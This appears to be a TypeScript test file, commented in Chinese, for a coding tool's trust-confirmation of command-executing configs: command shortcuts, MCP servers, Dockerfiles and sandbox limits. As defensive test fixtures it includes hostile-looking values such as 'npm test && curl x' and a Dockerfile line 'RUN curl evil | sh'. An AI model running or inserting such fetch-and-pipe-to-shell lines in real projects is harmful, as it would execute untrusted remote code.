// 第三道防线（决策 326 ③）：会执行命令的配置按内容确认。首次出现、内容变更、Dockerfile 内容变更都判为未确认；确认后记下
// 指纹、同样内容不再问；信任目录（只认用户级）免检；"本次不用"去掉那些条目；无人值守遇未确认即报错并逐条列出，
// --trust-config 只对本次放行、不记指纹。用户级一律指到临时目录。
import assert from "node:assert/strict";
import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, test } from "vitest";
import { loadSettings } from "../persistence/settings.ts";
import { configTrustPathOf, projectSettingsPath, userSettingsPath } from "../state/paths.ts";
import { commandsConfigOf, mcpConfigOf, sandboxConfigOf } from "../state/settings.ts";
import {
  ConfigNotConfirmedError,
  confirmSessionConfig,
  openSessionSettings,
  parseTrustAnswer,
  pendingTrustEntries,
  type TrustChoice,
  trustPromptText,
} from "./session-settings.ts";

const made: string[] = [];
afterAll(() => {
  for (const dir of made) rmSync(dir, { recursive: true, force: true });
});

function dirs(): { root: string; home: string } {
  const root = mkdtempSync(join(tmpdir(), "pigeon-trust-root-"));
  const home = mkdtempSync(join(tmpdir(), "pigeon-trust-home-"));
  made.push(root, home);
  return { root, home };
}

function write(file: string, value: unknown): void {
  mkdirSync(join(file, ".."), { recursive: true });
  writeFileSync(file, typeof value === "string" ? value : JSON.stringify(value));
}

const PROJECT = {
  commands: { commands: { test: "npm test" } },
  sandbox: { dockerfile: "ci/Dockerfile" },
};

function setup(): { root: string; home: string } {
  const { root, home } = dirs();
  write(projectSettingsPath(root), PROJECT);
  write(join(root, "ci", "Dockerfile"), "FROM alpine\n");
  write(join(root, ".mcp.json"), { mcpServers: { fx: { command: "node", args: ["fx.js"] } } });
  return { root, home };
}

const keys = (root: string, home: string) =>
  pendingTrustEntries(loadSettings(root, { homeDir: home }), home)
    .map((entry) => `${entry.kind}:${entry.id}`)
    .sort();

const asker = (choice: TrustChoice, seen: string[][] = []) => ({
  kind: "interactive" as const,
  ask: async (entries: readonly { kind: string; id: string }[]) => {
    seen.push(entries.map((entry) => `${entry.kind}:${entry.id}`).sort());
    return choice;
  },
});

test("首次出现即未确认；确认后记下指纹，同样内容不再问", async () => {
  const { root, home } = setup();
  assert.deepEqual(keys(root, home), ["command:test", "mcp-server:fx", "sandbox:sandbox"]);
  const seen: string[][] = [];
  await confirmSessionConfig(loadSettings(root, { homeDir: home }), {
    homeDir: home,
    confirmation: asker("trust", seen),
  });
  assert.equal(seen.length, 1);
  assert.ok(existsSync(configTrustPathOf(home)), "指纹记在用户级的程序状态目录");
  assert.deepEqual(keys(root, home), []);
  await confirmSessionConfig(loadSettings(root, { homeDir: home }), {
    homeDir: home,
    confirmation: asker("quit", seen),
  });
  assert.equal(seen.length, 1, "已确认的内容不再问");
});

test("内容变更判为未确认：命令串改了、MCP 启动定义改了、Dockerfile 内容改了、沙箱上限改了", async () => {
  const { root, home } = setup();
  await confirmSessionConfig(loadSettings(root, { homeDir: home }), {
    homeDir: home,
    confirmation: asker("trust"),
  });
  write(projectSettingsPath(root), {
    ...PROJECT,
    commands: { commands: { test: "npm test && curl x" } },
  });
  assert.deepEqual(keys(root, home), ["command:test"]);
  write(projectSettingsPath(root), PROJECT);
  write(join(root, ".mcp.json"), { mcpServers: { fx: { command: "node", args: ["evil.js"] } } });
  assert.deepEqual(keys(root, home), ["mcp-server:fx"]);
  write(join(root, ".mcp.json"), { mcpServers: { fx: { command: "node", args: ["fx.js"] } } });
  assert.deepEqual(keys(root, home), []);
  write(join(root, "ci", "Dockerfile"), "FROM alpine\nRUN curl evil | sh\n");
  assert.deepEqual(keys(root, home), ["sandbox:sandbox"]);
  write(join(root, "ci", "Dockerfile"), "FROM alpine\n");
  assert.deepEqual(keys(root, home), []);
  write(projectSettingsPath(root), {
    ...PROJECT,
    sandbox: { ...PROJECT.sandbox, memory: "4g" },
  });
  assert.deepEqual(keys(root, home), ["sandbox:sandbox"], "新增上限字段判为未确认");
  await confirmSessionConfig(loadSettings(root, { homeDir: home }), {
    homeDir: home,
    confirmation: asker("trust"),
  });
  assert.deepEqual(keys(root, home), []);
  write(projectSettingsPath(root), {
    ...PROJECT,
    sandbox: { ...PROJECT.sandbox, memory: "8g" },
  });
  assert.deepEqual(keys(root, home), ["sandbox:sandbox"], "改上限字段判为未确认");
  write(projectSettingsPath(root), {
    ...PROJECT,
    sandbox: { ...PROJECT.sandbox, memory: "8g", pids: 1024, cpus: 2 },
  });
  assert.deepEqual(keys(root, home), ["sandbox:sandbox"], "新增 pids/cpus 判为未确认");
});

test("信任目录：项目在用户级 trustedDirectories 之下免于确认", () => {
  const { root, home } = setup();
  write(userSettingsPath(home), { trustedDirectories: [join(root, "..")] });
  assert.deepEqual(keys(root, home), []);
  write(userSettingsPath(home), { trustedDirectories: [join(root, "elsewhere")] });
  assert.equal(keys(root, home).length, 3);
});

test("本次不用：去掉未确认的短名（连同角色清单里的引用）、沙箱一节与 MCP 服务，不记指纹", async () => {
  const { root, home } = setup();
  write(projectSettingsPath(root), {
    ...PROJECT,
    commands: { commands: { test: "npm test" }, roles: { tester: ["test"] } },
  });
  const notices: string[] = [];
  const used = await confirmSessionConfig(loadSettings(root, { homeDir: home }), {
    homeDir: home,
    confirmation: asker("skip"),
    notice: (line) => notices.push(line),
  });
  assert.deepEqual(commandsConfigOf(used), { commands: {}, roles: { tester: [] } });
  assert.deepEqual(sandboxConfigOf(used), {});
  assert.deepEqual(mcpConfigOf(used).servers, []);
  assert.equal(notices.length, 1);
  assert.ok(!existsSync(configTrustPathOf(home)));
  assert.equal(keys(root, home).length, 3, "下次仍要确认");
});

test("退出：报错，不记指纹", async () => {
  const { root, home } = setup();
  await assert.rejects(
    confirmSessionConfig(loadSettings(root, { homeDir: home }), {
      homeDir: home,
      confirmation: asker("quit"),
    }),
    ConfigNotConfirmedError
  );
});

test("无人值守：未确认即报错并逐条列出、说明 --trust-config；加了只对本次放行、不记指纹", async () => {
  const { root, home } = setup();
  await assert.rejects(
    openSessionSettings(root, {
      homeDir: home,
      confirmation: { kind: "unattended", trustConfig: false },
    }),
    (error: unknown) =>
      error instanceof ConfigNotConfirmedError &&
      /命令短名 test：npm test/.test(error.message) &&
      /MCP 服务 fx：node fx\.js/.test(error.message) &&
      /沙箱配置 sandbox/.test(error.message) &&
      /--trust-config/.test(error.message)
  );
  const allowed = await openSessionSettings(root, {
    homeDir: home,
    confirmation: { kind: "unattended", trustConfig: true },
  });
  assert.deepEqual(commandsConfigOf(allowed).commands, { test: "npm test" });
  assert.ok(!existsSync(configTrustPathOf(home)), "放行不记指纹");
});

test("行内问答：列出每条（来自哪一层、类型、标识、完整命令），a / s / q 三种回答，认不出的再问", () => {
  const { root, home } = setup();
  const entries = pendingTrustEntries(loadSettings(root, { homeDir: home }), home);
  const text = trustPromptText(entries);
  assert.match(text, /\[项目共享\] 命令短名 test：npm test/);
  assert.match(text, /\[\.mcp\.json\] MCP 服务 fx：node fx\.js/);
  assert.match(
    text,
    /\[项目共享\] 沙箱配置 sandbox：.*Dockerfile ci\/Dockerfile 内容 sha256 [0-9a-f]{12}/
  );
  assert.match(text, /a 全部确认并记下 ｜ s 本次不用这些条目 ｜ q 退出/);
  assert.equal(parseTrustAnswer(" A "), "trust");
  assert.equal(parseTrustAnswer("s"), "skip");
  assert.equal(parseTrustAnswer("q"), "quit");
  assert.equal(parseTrustAnswer("yes"), undefined);
});
